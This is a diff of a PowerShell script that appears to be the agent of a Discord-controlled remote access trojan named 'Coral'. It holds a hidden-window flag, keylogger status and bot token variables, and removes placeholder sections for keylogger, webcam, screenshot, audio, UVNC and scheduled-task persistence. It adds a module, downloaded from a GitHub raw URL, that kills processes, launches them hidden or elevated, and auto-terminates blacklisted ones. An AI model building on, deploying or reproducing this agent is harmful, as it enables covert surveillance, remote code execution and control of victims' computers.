@@ -1,5 +1,4 @@
 #v1
-
 # =============================== GLOBAL VARIABLES - IMPT ===============================
 $global:token = $token
 $script:Jobs = @{}
@@ -7,6 +6,7 @@ $global:hidewindow = $true
 $global:keyloggerstatus = $false
 $global:lastMessageAttachments = $null
 $global:lastJobCheck = Get-Date
+$global:processes = @()
 # =============================== GLOBAL VAR - THEME (WIP) ==============================
 # You can add more here but gotta install the files yourself ( URL not supported for now )
 # shld add download and stuff
@@ -551,17 +551,6 @@ function HideWindow {
     }
 }
 
-# =============================== KEYLOGGER FUNCTIONS (R)===============================
-#ENABLENEKOLOGGER
-#DISABLENEKOLOGGER
-#NEKOLOGGERSTATUS
-# =============================== SS FUNCTIONS (R) ===============================
-#SCREENSHOT
-# =============================== WEBCAM FUNCTIONS (R) ===============================
-#WEBCAM
-# =============================== AUDIO (R) ========================================
-#AUDIO
-# =============================== JOB MANAGEMENT FUNCTIONS ===============================
 function Start_AgentJob {
     param($ScriptString)
     $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
@@ -835,16 +824,6 @@ function Check_CompletedJobs {
     }
 }
 
-# =============================== UVNC FUNCTIONS (R)===============================
-#ENABLEUVNC
-#DISABLEUVNC
-# =============================== DISCORD (R) =============== 
-#ENABLENEKO
-#REMOVENEKO
-# =============================== SCRIPT MANAGEMENT ===============================
-
-
-
 function Cleanup_CoralAgent {
     try {
         if ($global:CoralMutex) {
@@ -856,13 +835,7 @@ function Cleanup_CoralAgent {
     } catch {}
 }
 
-
 trap { try { Cleanup_CoralAgent } catch {}; continue }
-
-
-# =============================== PERSISTENCE ( R )=============================
-#ENABLEPTASK
-#DISABLEPTASK
 
 # =============================== MODULES (WIP) ===============================
 $global:ModuleRegistry = @{
@@ -1058,6 +1031,91 @@ $global:ModuleRegistry = @{
         }
         loaded = $false
         required = $false
+    }
+    PROCESS_MANAGEMENT = @{
+    name = "Process Management Module"
+    baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/process_management/"
+    scripts = @{
+        PROCESSLIST = @{
+            url = "Mprocess_management.ps1"
+            function = "MGet_ProcessList"
+            alias = "PROCESSLIST"
+            description = "Get list of running processes"
+            params = @("filter", "sortBy")
+        }
+        KILLPROCESS = @{
+            url = "Mprocess_management.ps1"
+            function = "MKill_Process"
+            alias = "KILLPROCESS"
+            description = "Terminate a process by name or PID"
+            params = @("processName", "processId")
+        }
+        STARTPROCESS = @{
+            url = "Mprocess_management.ps1"
+            function = "MStart_Process"
+            alias = "STARTPROCESS"
+            description = "Start a new process"
+            params = @("executablePath", "arguments", "hidden", "elevated")
+        }
+        ADDBLACKLIST = @{
+            url = "Mprocess_management.ps1"
+            function = "MAdd_ProcessBlacklist"
+            alias = "ADDBLACKLIST"
+            description = "Add process to blacklist (auto-terminate)"
+            params = @("processName")
+        }
+        REMOVEBLACKLIST = @{
+            url = "Mprocess_management.ps1"
+            function = "MRemove_ProcessBlacklist"
+            alias = "REMOVEBLACKLIST"
+            description = "Remove process from blacklist"
+            params = @("processName")
+        }
+        SHOWBLACKLIST = @{
+            url = "Mprocess_management.ps1"
+            function = "MShow_ProcessBlacklist"
+            alias = "SHOWBLACKLIST"
+            description = "Show current process blacklist"
+            params = @()
+        }
+        STARTPROCESSMONITOR = @{
+            url = "Mprocess_management.ps1"
+            function = "MStart_ProcessMonitoring"
+            alias = "ENABLEPROCESSMONITOR"
+            description = "Start monitoring for new processes"
+            params = @("intervalSeconds")
+        }
+        STOPPROCESSMONITOR = @{
+            url = "Mprocess_management.ps1"
+            function = "MStop_ProcessMonitoring"
+            alias = "DISABLEPROCESSMONITOR"
+            description = "Stop process monitoring"
+            params = @()
+        }
+        PROCESSMONITORSTATUS = @{
+            url = "Mprocess_management.ps1"
+            function = "MGet_ProcessMonitoringStatus"
+            alias = "PROCESSMONITORSTATUS"
+            description = "Check process monitoring status"
+            params = @()
+        }
+        PROCESSDETAILS = @{
+            url = "Mprocess_management.ps1"
+            function = "MGet_ProcessDetails"
+            alias = "PROCESSDETAILS"
+            description = "Get detailed information about a process"
+            params = @("processName", "processId")
+        }
+        PROCESSMONITORCLEANUP = @{
+            url = "Mprocess_management.ps1"
+            function = "MProcMon_Cleanup"
+            alias = "PROCESSMONITORCLEANUP"
+            description = "Clean up process monitoring data"
+            params = @()
+        }
+    }
+    loaded = $false
+    required = $false
     }
 }
 function Is_LocalFunction {
@@ -1611,6 +1669,7 @@ while ($true) {
                 Stop_AllAgentJobs
                 RemoveFfmpeg
                 Execute_DynamicCommandWithParams -Command "DISABLENEKOUVNC"
+                Execute_DynamicCommandWithParams -Command "PROCESSMONITORCLEANUP"
                 Cleanup_CoralAgent
                 exit 
             }
